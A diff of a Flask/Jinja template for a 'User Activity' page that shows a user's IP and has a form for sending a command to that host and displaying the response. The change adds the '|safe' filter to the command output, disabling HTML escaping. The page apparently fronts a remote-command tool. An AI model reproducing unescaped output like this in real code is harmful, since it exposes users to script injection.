@@ -1,18 +1,19 @@
 {% extends "layout.html" %}
 {% block title %}User Activity{% endblock %}
 {% block content %}
-<h1>User Activity</h1>
 <form method="post">
-    <input type="submit" name="submit" value="<--"></form>
+<a class="user-text">User Activity</a>
+    <input class="back_btn" type="submit" name="submit" value="<--">
+</form>
 <h2>USER IP -- {{ ip }} --</h2>
 <form method="post">
     <input type="submit" name="submit" value="SEND COMMAND">
     <input name=text>
     <input name="host" type="hidden" value="{{ ip }}"></br>
+</form>
     {% if cmd_response %}
     <p> RESPONSE </p>
-    <p> {{ cmd_response  }}</p>
+    <p> {{ cmd_response|safe }} </p>
     {% endif %}
-</form>
 
 {% endblock %}
